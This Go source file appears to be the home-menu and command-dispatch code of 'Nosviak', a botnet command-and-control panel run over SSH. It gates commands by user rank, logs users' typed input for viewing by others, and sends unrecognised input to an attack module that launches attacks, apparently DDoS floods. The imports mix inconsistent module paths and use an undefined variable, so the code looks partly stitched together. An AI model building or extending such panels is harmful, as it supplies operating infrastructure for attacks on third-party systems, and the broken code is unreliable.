package views

import (
	"Nosviak/core/masters/commands"
	"Nosviak/core/masters/sessions"
	"Nosviak/core/masters/users/ranks"
	"Nosviak/core/models/configs/toml"
	"Nosviak/core/models/views"
	"strings"
	"time"
	"golang.org/x/term"
	"main.go/core/attacks"
)

//new home menu instance
//this will render the entire new session stuff
func NewHome(session *sessions.Session) error {

	//checks if the user is banned and renders the banned splash
	//makes sure the user knows he is banned
	banned, err := BannedUser(session)

	//checks if the user is banned or if there was an error
	//this will make sure the system doesn't carry on once he has been banned
	if err != nil || banned {
		//makes sure we close the session
		//this fully closes the ssh tunnel with the channel
		session.Channel.Close()
		return err
	}
	
	//executes the dtx sub syntax properly
	//this is the main home screen correctly. mainly used for decorating the entire cnc
	if err := views.NewDTX("welcome.dtx", session.Write).Template(session, session.Channel); err != nil {
		return err
	}

	//creates a new reader for this object
	//creates a new terminal instance so we can read from safel
	NewTerm := term.NewTerminal(session.Channel, "")

	//for loops until told now too
	for {
		//executes the prompt information
		//the prompt will be the lining for the readLine function below this
		if err := views.NewDTX("prompt.dtx", session.Write).Template(session, session.Channel); err != nil {
			return err
		}

		//reads the line which was bounced of the prompt
		//this will read into a string structure and return an err is ilegal charaters were found
		incoming, err := NewTerm.ReadLine()

		//mainly used for viewing other peoples sessions
		//this also can be used to view what other people have been viewing
		session.Written = append(session.Written, incoming)
		session.Written = append(session.Written, "\r\n")

		//error handles the incoming command correctly
		//this is where we can control what we do with the output
		if err != nil {
			//toml option one
			//choice between hanging the connection and rejumping the connection
			if Toml.TerminalToml.Terminal.PromptDisconnect <= 1 {
				//executes the error code for when the prompt has disconnected
				//this is a simple err code, most poeple will choose the rerender option
				if err := views.NewDTX("prompt-disconnect.dtx", session.Write).Template(session, session.Channel); err != nil {
					return err
				}	

				//closes the channel
				//this will hang the connection with the instance
				session.Channel.Close()
				return nil
			} else if Toml.TerminalToml.Terminal.PromptDisconnect >= 2 {
				//renders the home screen
				//this is a safe output
				return NewHome(session)
			}

			//forces the engine to loop again
			//without outputting an object correctly
			continue
		}

		//updates the users current idle time to present
		//updates the last idle time detected properly
		sessions.Sessions[session.Connected.Unix()].Idle = time.Now()
		

		//trys to execute the command
		//this is mainly execute the command and returns any errors
		if err := ExecuteCommand(incoming, session); err != nil {
			continue
		}
	}
}


//executes the command which was entered/asked for
//looks & permissions checks the command which was asked for safely
func ExecuteCommand(command string, session *sessions.Session) error {

	//splits the string into multiply different slices
	//this will split the command by spaces which will give us chuncks of commands
	cmd := strings.Split(command, " ")

	//checks if the command is nil
	//this is basic so we don't pass nil commands into the search props
	if cmd[0] == "" {
		//returns the nil pointer argument
		//what the system executes when the command is equal to nil
		return views.NewDTX("command-nil.dtx", session.Write).RegisterVariable("command", cmd[0]).Template(session, session.Channel)
	}

	//gets the commands from the map
	//this allows use to search for the command inside the array properly
	gotten := commands.GetCommand(cmd[0])
	if gotten == nil {

		//checks if the command is an attack instead of a basic command
		//this will check if the command is an attack
		attk, err := attacks.NewAttack(cmd, session)

		//checks if the error is due to an invalid method
		//this will properly return the invalid method detail (instead of command-404.dtx)
		if err == attacks.ErrInvalidMethod {
			//returns the 404 argument to the session
			return views.NewDTX("command-404.dtx", session.Write).RegisterVariable("command", cmd[0]).Template(session, session.Channel)
		}

		//returns the attack error
		//this will properly launch the attack
		return attk.PerformAttack()
	}

	if err := views.NewDTX("before-command.dtx", session.Write).RegisterVariable("command", cmd[0]).Template(session, session.Channel); err != nil {
		return err
	}

	//checks if the user can access this command
	//this is permission checking for the main command inside the function
	has, err := ranks.AccessCommand(gotten.MinPermissions, session.User)
	if err != nil || !has {
		return views.NewDTX("command-403.dtx", session.Write).RegisterVariable("command", cmd[0]).Template(session, session.Channel)
	}

	//checks if the length of the string 
	//if the length is valid it will allow the user to execute a subcommand body
	if len(cmd) >= 2 {
		//checks for a possible subcommand
		//checks if there is a subcommand by the name passed
		sub := gotten.IndexSubCommand(cmd[1])

		//checks if a subcommand wasn't correctly found
		//this checks if there is a subcommand that was found
		if sub == nil {
			//correctly indexs the subcommands
			//this will make it eaiser for the system to find
			ReSub := gotten.IndexSubCommand(strings.Split(cmd[1], "=")[0])
			if ReSub != nil {
				//if the subcommand isn't equal to nil
				//we will now update the current subcommand
				sub = ReSub
			} else {

				//checks if the invalid subcommand feature is equal to nil
				//if the command.invalidsubcommand is equal to nil we will execute the normal piece
				if gotten.InvalidSubCommand == nil {
					//executes the default function if a sub command can't be found
					//executes the default permission statement
					return gotten.ZeroArguments(session, cmd)
				}
				
				return gotten.InvalidSubCommand(session, cmd)
			}

		} 
		
		if sub != nil {
			//checks if the user can access this subcommand
			//this checks if the user can execute the subcommand
			has, err := ranks.AccessCommand(sub.MinPermissions, session.User)
			if err != nil || !has {
				return views.NewDTX("subcommand-403.dtx", session.Write).RegisterVariable("command", cmd[0]).RegisterVariable("subcommand", cmd[1]).Template(session, session.Channel)
			}

			//executes the subcommand body if a subcommand was found
			//this will properly and safely execute the subBody for the subcommand
			if err := sub.ExecutionBody(session, cmd); err != nil {
				return err
			}
		}
	} else {
		//executes the default feature as a subcommand wasn't passed
		//as a subcommand wasn't passwrd we will just execute the default option
		if err := gotten.ZeroArguments(session, cmd); err != nil {
			return err
		}
	}

	//executes the aftercommand ref
	return views.NewDTX("after-command.dtx", session.Write).RegisterVariable("command", cmd[0]).Template(session, session.Channel)
}
